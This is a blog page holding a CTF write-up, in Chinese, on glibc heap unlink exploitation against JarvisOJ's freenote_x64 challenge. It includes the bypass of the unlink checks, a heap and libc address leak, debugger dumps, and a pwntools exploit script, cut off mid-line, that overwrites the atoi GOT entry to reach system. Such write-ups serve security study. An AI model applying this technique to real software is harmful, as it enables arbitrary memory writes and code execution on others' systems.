@@ -1,0 +1,483 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  <title>Unlink | sir</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="花里花外花中雾 花飞花落一条路百年修得同船渡 千年岂能朝思暮">
+<meta name="keywords" content="-pwn-堆">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Unlink">
+<meta property="og:url" content="https://cc-sir.github.io/2019/03/03/unlink/index.html">
+<meta property="og:site_name" content="sir">
+<meta property="og:description" content="花里花外花中雾 花飞花落一条路百年修得同船渡 千年岂能朝思暮">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2019-03-03T11:09:11.761Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Unlink">
+<meta name="twitter:description" content="花里花外花中雾 花飞花落一条路百年修得同船渡 千年岂能朝思暮">
+  
+    <link rel="alternative" href="/atom.xml" title="sir" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.png">
+  
+  
+      <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+  
+      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <!-- 加载特效 -->
+    <script src="/js/pace.js"></script>
+    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet">
+  <script>
+      var yiliaConfig = {
+          rootUrl: '/',
+          fancybox: true,
+          animate: true,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false
+      }
+  </script>
+</head></html>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            
+            <img lazy-src="/img/touxiang.png" class="js-avatar">
+            
+        </a>
+
+        <hgroup>
+          <h1 class="header-author"><a href="/" title="Hi Mate">钞sir</a></h1>
+        </hgroup>
+
+        
+        
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">博客首页</a></li>
+                        
+                            <li><a href="/archives">所有文章</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fl mail" target="_blank" href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=1787684615@qq.com" title="mail">mail</a>
+                            
+                                <a class="fl github" target="_blank" href="https://github.com/cc-sir" title="github">github</a>
+                            
+                                <a class="fl QQ" target="_blank" href="tencent://QQInterLive/?Cmd=2&Uin=1787684615" title="QQ">QQ</a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <a href="/tags/pwn-堆/" style="font-size: 10px;">-pwn-堆</a> <a href="/tags/writeup/" style="font-size: 10px;">-writeup</a> <a href="/tags/pwn-堆/" style="font-size: 20px;">pwn-堆</a> <a href="/tags/pwn-栈/" style="font-size: 20px;">pwn-栈</a> <a href="/tags/writeup/" style="font-size: 20px;">writeup</a>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://ThunderJie.github.io/">ThunderJie</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://optimic.github.io/">观樂。</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">我已无力接住你，再也不能抗风雨</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="Me">钞sir</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                
+                    <img lazy-src="/img/touxiang.png" class="js-avatar">
+                
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="Me">钞sir</a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">博客首页</a></li>
+                
+                    <li><a href="/archives">所有文章</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                <div class="social">
+                    
+                        <a class="mail" target="_blank" href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=1787684615@qq.com" title="mail">mail</a>
+                    
+                        <a class="github" target="_blank" href="https://github.com/cc-sir" title="github">github</a>
+                    
+                        <a class="QQ" target="_blank" href="tencent://QQInterLive/?Cmd=2&Uin=1787684615" title="QQ">QQ</a>
+                    
+                </div>
+            </nav>
+        </header>                
+    </div>
+</nav>
+      <div class="body-wrap"><article id="post-unlink" class="article article-type-post" itemscope="" itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2019/03/03/unlink/" class="article-date">
+      <time datetime="2019-03-03T11:09:11.761Z" itemprop="datePublished">2019-03-03</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Unlink
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn-堆/">-pwn-堆</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>花里花外花中雾 花飞花落一条路<br>百年修得同船渡 千年岂能朝思暮</p>
+<a id="more"></a>
+<hr>
+<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>unlink是在smallbin被释放的时候的一种操作，是将当前物理内存相邻的free chunk进行合并,简单的讲就是我们在free一个smallchunk的时候，如果它前面或者后面的chunk有空闲的，即in_use位为0时，就将前面或后面的chunk连在一起合成一个chunk;<br>smallbin的数据结构：prev_size,size,fd,bk;<br>因为smallbin被释放后是用双链串在一起的，这就使目前unlink操作时，有一定的检查机制，主要检查我们的双链是否是合法的；<br>主要检查fd,bk等指针：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fd bk</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      </span><br><span class="line">  malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P, AV);</span><br></pre></td></tr></table></figure></p>
+<p>在双向链表中，所以有两个地方记录chunk的大小，所以检查一下其大小是否一致：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      </span><br><span class="line">      malloc_printerr (<span class="string">"corrupted size vs. prev_size"</span>);</span><br></pre></td></tr></table></figure></p>
+<p>unlink操作的简要代码：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(P, BK, FD)</span></span><br><span class="line">&#123;</span><br><span class="line">    FD = P-&gt;fd;</span><br><span class="line">    BK = P-&gt;bk;</span><br><span class="line">    <span class="keyword">if</span>(FD-&gt;bk != P || BK-&gt;fd !=p)</span><br><span class="line">    &#123;</span><br><span class="line">        malloc_printerr (check_action, <span class="string">"corrupted d..."</span>, P);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        FD-&gt;bk = BK;</span><br><span class="line">        BK-&gt;fd = FD;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<hr>
+<h2 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h2><p>实际上，我们还是有办法绕过unlink的检查，不过需要有一些条件：</p>
+<ol>
+<li>有一个指向heap内的指针；</li>
+<li>存放这个指针的地址已知(一般这个地址(&amp;p)是全局变量)；</li>
+<li>可以对这个指针进行多次写入；<br>然后我们想办法修改p的fd和p的bk分别为:<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//64位</span></span><br><span class="line">p-&gt;fd = &amp;p - <span class="number">0x18</span>; <span class="comment">//fd</span></span><br><span class="line">p-&gt;bk = &amp;p - <span class="number">0x10</span>; <span class="comment">//bk</span></span><br><span class="line"><span class="comment">//32位</span></span><br><span class="line">p-&gt;fd = &amp;p - <span class="number">12</span>; <span class="comment">//fd</span></span><br><span class="line">p-&gt;bk = &amp;p - <span class="number">8</span>; <span class="comment">//bk</span></span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>这样我们就可以绕过(FD-&gt;bk != P || BK-&gt;fd !=p)检测了，当unlink的操作完了之后，我们得到：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//64位</span></span><br><span class="line">p = &amp;p - <span class="number">0x18</span>；</span><br><span class="line"><span class="comment">//32位</span></span><br><span class="line">p = &amp;p - <span class="number">12</span>;</span><br></pre></td></tr></table></figure></p>
+<h1 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h1><p>我们以JarvisOJ中的<a href="https://dn.jarvisoj.com/challengefiles/level6_x64.rar.411d6ed2269d4c8402b9e3148f4f64a5" target="_blank" rel="noopener">freenote_x64</a>来具体演示一下绕过unlink的操作并且熟悉一下smallbin的结构；<br>这道题在add函数和edit函数中，真实malloc的size最小都是0x80，也就是我们申请的是smallbin,所以操作的也是samllbin；<br>主要漏洞在delete note里：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">cdecl <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [sp+Ch] [bp-4h]@2</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( chunk_list-&gt;number &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"No posts yet."</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Post number: "</span>);</span><br><span class="line">    i = get_num();</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= <span class="number">0</span> &amp;&amp; i &lt; chunk_list-&gt;sum )        <span class="comment">// 未检查inuse位，double_free</span></span><br><span class="line">    &#123;</span><br><span class="line">      --chunk_list-&gt;number;</span><br><span class="line">      chunk_list-&gt;block[i].in_use = <span class="number">0L</span>L;</span><br><span class="line">      chunk_list-&gt;block[i].len = <span class="number">0L</span>L;</span><br><span class="line">      <span class="built_in">free</span>(chunk_list-&gt;block[i].ptr);           <span class="comment">// 指针未清空</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Done."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Invalid number!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>还有一个有用的漏洞就是add和edit时，我们输入的字符串没有‘\x00’结尾符，我们输入多大的size就读多少size的字符，没有多余；</p>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>所以基本思路就是我们先申请4个chunk，然后free(0)和free(2)，防止合并；然后在申请2个chunk，只写入8字节，就可以leak出heap和libc的基地址;<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span>  <span class="number">30</span> <span class="number">2</span>e <span class="number">20</span> <span class="number">71</span>  <span class="number">71</span> <span class="number">71</span> <span class="number">71</span> <span class="number">71</span>  <span class="number">71</span> <span class="number">71</span> <span class="number">71</span> <span class="number">40</span>  c9 <span class="number">6</span>c <span class="number">0</span>a <span class="number">31</span>  │<span class="number">0.</span> q│qqqq│qqq@│·l·<span class="number">1</span>│</span><br><span class="line"><span class="number">00000010</span>  <span class="number">2</span>e <span class="number">20</span> <span class="number">62</span> <span class="number">62</span>  <span class="number">62</span> <span class="number">62</span> <span class="number">62</span> <span class="number">62</span>  <span class="number">62</span> <span class="number">62</span> <span class="number">0</span>a <span class="number">32</span>  <span class="number">2</span>e <span class="number">20</span> <span class="number">73</span> <span class="number">73</span>  │. bb│bbbb│bb·<span class="number">2</span>│. ss│</span><br><span class="line"><span class="number">00000020</span>  <span class="number">73</span> <span class="number">73</span> <span class="number">73</span> <span class="number">73</span>  <span class="number">73</span> <span class="number">73</span> b8 <span class="number">07</span>  d4 <span class="number">1</span>c <span class="number">39</span> <span class="number">7</span>f  <span class="number">0</span>a <span class="number">33</span> <span class="number">2</span>e <span class="number">20</span>  │ssss│ss··│··<span class="number">9</span>·│·<span class="number">3.</span> │</span><br><span class="line"><span class="number">00000030</span>  <span class="number">64</span> <span class="number">64</span> <span class="number">64</span> <span class="number">64</span>  <span class="number">64</span> <span class="number">64</span> <span class="number">64</span> <span class="number">64</span>  <span class="number">0</span>a <span class="number">3</span>d <span class="number">3</span>d <span class="number">20</span>  <span class="number">30</span> <span class="number">6</span>f <span class="number">70</span> <span class="number">73</span>  │dddd│dddd│·== │<span class="number">0</span>ops│</span><br><span class="line"><span class="number">00000040</span>  <span class="number">20</span> <span class="number">46</span> <span class="number">72</span> <span class="number">65</span>  <span class="number">65</span> <span class="number">20</span> <span class="number">4</span>e <span class="number">6</span>f  <span class="number">74</span> <span class="number">65</span> <span class="number">20</span> <span class="number">3</span>d  <span class="number">3</span>d <span class="number">0</span>a <span class="number">31</span> <span class="number">2</span>e  │ Fre│e No│te =│=·<span class="number">1.</span>│</span><br><span class="line"><span class="number">00000050</span>  <span class="number">20</span> <span class="number">4</span>c <span class="number">69</span> <span class="number">73</span>  <span class="number">74</span> <span class="number">20</span> <span class="number">4</span>e <span class="number">6</span>f  <span class="number">74</span> <span class="number">65</span> <span class="number">0</span>a <span class="number">32</span>  <span class="number">2</span>e <span class="number">20</span> <span class="number">4</span>e <span class="number">65</span>  │ Lis│t No│te·<span class="number">2</span>│. Ne│</span><br><span class="line"><span class="number">00000060</span>  <span class="number">77</span> <span class="number">20</span> <span class="number">4</span>e <span class="number">6</span>f  <span class="number">74</span> <span class="number">65</span> <span class="number">0</span>a <span class="number">33</span>  <span class="number">2</span>e <span class="number">20</span> <span class="number">45</span> <span class="number">64</span>  <span class="number">69</span> <span class="number">74</span> <span class="number">20</span> <span class="number">4</span>e  │w No│te·<span class="number">3</span>│. Ed│it N│</span><br><span class="line"><span class="number">00000070</span>  <span class="number">6</span>f <span class="number">74</span> <span class="number">65</span> <span class="number">0</span>a  <span class="number">34</span> <span class="number">2</span>e <span class="number">20</span> <span class="number">44</span>  <span class="number">65</span> <span class="number">6</span>c <span class="number">65</span> <span class="number">74</span>  <span class="number">65</span> <span class="number">20</span> <span class="number">4</span>e <span class="number">6</span>f  │ote·│<span class="number">4.</span> D│elet│e No│</span><br><span class="line"><span class="number">00000080</span>  <span class="number">74</span> <span class="number">65</span> <span class="number">0</span>a <span class="number">35</span>  <span class="number">2</span>e <span class="number">20</span> <span class="number">45</span> <span class="number">78</span>  <span class="number">69</span> <span class="number">74</span> <span class="number">0</span>a <span class="number">3</span>d  <span class="number">3</span>d <span class="number">3</span>d <span class="number">3</span>d <span class="number">3</span>d  │te·<span class="number">5</span>│. Ex│it·=│====│</span><br><span class="line"><span class="number">00000090</span>  <span class="number">3</span>d <span class="number">3</span>d <span class="number">3</span>d <span class="number">3</span>d  <span class="number">3</span>d <span class="number">3</span>d <span class="number">3</span>d <span class="number">3</span>d  <span class="number">3</span>d <span class="number">3</span>d <span class="number">3</span>d <span class="number">3</span>d  <span class="number">3</span>d <span class="number">3</span>d <span class="number">3</span>d <span class="number">0</span>a  │====│====│====│===·│</span><br><span class="line"><span class="number">000000</span>a0  <span class="number">59</span> <span class="number">6</span>f <span class="number">75</span> <span class="number">72</span>  <span class="number">20</span> <span class="number">63</span> <span class="number">68</span> <span class="number">6</span>f  <span class="number">69</span> <span class="number">63</span> <span class="number">65</span> <span class="number">3</span>a  <span class="number">20</span>           │Your│ cho│ice:│ │</span><br><span class="line"></span><br><span class="line">s = p.recv()</span><br><span class="line">lib_addr = u64(s[<span class="number">39</span>:<span class="number">45</span>] + <span class="string">'\x00\x00'</span>) - <span class="number">0x3c27b8</span></span><br><span class="line">heap_addr = u64(s[<span class="number">11</span>:<span class="number">15</span>] + <span class="string">'\x00'</span>*<span class="number">4</span>) - <span class="number">0x1940</span> + <span class="number">0x30</span></span><br><span class="line">system_addr = lib_addr + libc.symbols[<span class="string">'system'</span>]</span><br></pre></td></tr></table></figure></p>
+<p>在heap基地址偏移0x30的地方有我们需要的&amp;p:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20gx 0x603000</span><br><span class="line">0x603000:	0x0000000000000000	 0x0000000000001821</span><br><span class="line">0x603010:	0x0000000000000100	 0x0000000000000004</span><br><span class="line">0x603020:	0x0000000000000001	 0x0000000000000004</span><br><span class="line">0x603030:&amp;p	0x0000000000604830 p 0x0000000000000001</span><br><span class="line">0x603040:	0x0000000000000002	 0x00000000006048c0</span><br><span class="line">0x603050:	0x0000000000000001	 0x0000000000000001</span><br><span class="line">0x603060:	0x0000000000604950	 0x0000000000000001</span><br><span class="line">0x603070:	0x0000000000000004	 0x00000000006049e0</span><br><span class="line">0x603080:	0x0000000000000000	 0x0000000000000000</span><br><span class="line">0x603090:	0x0000000000000000	 0x0000000000000000</span><br></pre></td></tr></table></figure></p>
+<p>有了&amp;p之后我们就可以构造chunk，然后unlink了；<br>unlink之后的&amp;p,此时p=&amp;p-0x18:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20gx 0x603000</span><br><span class="line">0x603000:	0x0000000000000000	 0x0000000000001821</span><br><span class="line">0x603010:	0x0000000000000100	 0x0000000000000004</span><br><span class="line">0x603020:	0x0000000000000000	 0x0000000000000000</span><br><span class="line">0x603030:	0x0000000000603018 p 0x0000000000000001 //p=&amp;p-0x18</span><br><span class="line">0x603040:	0x0000000000000008	 0x00000000006048c0</span><br><span class="line">0x603050:	0x0000000000000001	 0x0000000000000001</span><br><span class="line">0x603060:	0x0000000000604950	 0x0000000000000001</span><br><span class="line">0x603070:	0x0000000000000004	 0x00000000006049e0</span><br><span class="line">0x603080:	0x0000000000000000	 0x0000000000000000</span><br><span class="line">0x603090:	0x0000000000000000	 0x0000000000000000</span><br></pre></td></tr></table></figure></p>
+<p>然后现在我们就可以修改0x0603018地址开始的内容了，然后就可以修改指针达到任意地址写入了；</p>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'deepin-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span> ,<span class="string">'-c'</span>]</span><br><span class="line"><span class="comment">#p = process('./freenote')</span></span><br><span class="line">p = remote(<span class="string">'pwn2.jarvisoj.com'</span>, <span class="number">9886</span>)</span><br><span class="line">elf= ELF(<span class="string">'./freenote'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./bc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.G:</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(s)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Length of new note: '</span>)</span><br><span class="line">    p.sendline(str(len(s)))</span><br><span class="line">    p.recvuntil(<span class="string">'Enter your note: '</span>)</span><br><span class="line">    p.send(s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(i,s)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Note number: '</span>)</span><br><span class="line">    p.sendline(str(i))</span><br><span class="line">    p.recvuntil(<span class="string">'Length of note: '</span>)</span><br><span class="line">    p.sendline(str(len(s)))</span><br><span class="line">    p.recvuntil(<span class="string">'Enter your note: '</span>)</span><br><span class="line">    p.send(s)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(i)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Note number: '</span>)</span><br><span class="line">    p.sendline(str(i))</span><br><span class="line">   </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'5'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">'a'</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="string">'b'</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="string">'c'</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="string">'d'</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">'q'</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="string">'s'</span>*<span class="number">8</span>)</span><br><span class="line"><span class="comment">#leak</span></span><br><span class="line">show()</span><br><span class="line">s = p.recv()</span><br><span class="line">lib_addr = u64(s[<span class="number">39</span>:<span class="number">45</span>] + <span class="string">'\x00\x00'</span>) - <span class="number">0x3c27b8</span></span><br><span class="line">heap_addr = u64(s[<span class="number">11</span>:<span class="number">15</span>] + <span class="string">'\x00'</span>*<span class="number">4</span>) - <span class="number">0x1940</span> + <span class="number">0x30</span></span><br><span class="line">system_addr = lib_addr + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"lib_addr: "</span> + hex(lib_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"heap_addr: "</span> + hex(heap_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system_addr: "</span> + hex(system_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#unlink</span></span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Note number: '</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">pay = p64(<span class="number">0x90</span>) + p64(<span class="number">0x80</span>) + p64(heap_addr - <span class="number">0x18</span>) + p64(heap_addr - <span class="number">0x10</span>) + <span class="string">'a'</span>*<span class="number">0x60</span></span><br><span class="line">pay+= p64(<span class="number">0x80</span>) + p64(<span class="number">0x90</span>+<span class="number">0x90</span>) + <span class="string">'b'</span>*<span class="number">0x70</span></span><br><span class="line">edit(<span class="number">0</span>,pay)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#getshell</span></span><br><span class="line">payload = p64(<span class="number">2</span>) + p64(<span class="number">1</span>) + p64(<span class="number">100</span>) + p64(heap_addr - <span class="number">0x18</span>) + p64(<span class="number">1</span>) + p64(<span class="number">0x8</span>) + p64(elf.got[<span class="string">'atoi'</span>]) </span><br><span class="line">payload+= <span class="string">'\x00'</span>*(<span class="number">0x100</span>-len(payload))</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">edit(<span 